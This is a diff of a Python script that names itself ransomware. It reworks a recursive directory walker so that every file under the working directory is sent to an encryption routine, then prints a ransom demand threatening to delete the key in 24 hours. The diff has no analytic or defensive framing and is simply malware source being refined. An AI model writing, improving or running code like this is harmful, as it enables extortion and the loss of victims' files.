@@ -35,22 +35,20 @@ def file_encrypter(path) :
             
 
 # getting files
-def get_root_files(path) :
-    for dir in os.listdir(path) :
-        if os.path.isdir(dir) == True :
-            get_root_files(dir)
-        else :
-            file_encrypter(dir)
+def Get_root_files(path) :
+    length_of_files = len(os.listdir(path))
+    for file in range(length_of_files) :
+       current = os.listdir(path)[file]
+       current = path + '/' + os.listdir(path)[file]
+       if os.path.isdir(current) == True :
+           Get_root_files(current)
+       elif os.path.isfile(current) == True :
+           file_encrypter(current)
+       if file == length_of_files - 1 :
+          char = '/' + os.listdir(path)[file]
+          current = current.replace(char,'')
+Get_root_files(working_directory)
 
-# scanning for targets
-for target in os.listdir(working_directory) :
-    if target == 'Ransomware by Destiny' :
-        continue
-    if os.path.isdir(target) == True :
-         get_root_files(target)
-    else :
-         pass
-         file_encrypter(path)  
 print(colorama.Fore.RED + 'You have been hacked')
 print('All your files are encrypted')
 print('Pay me money or i will delete the key in 24 hours ....')
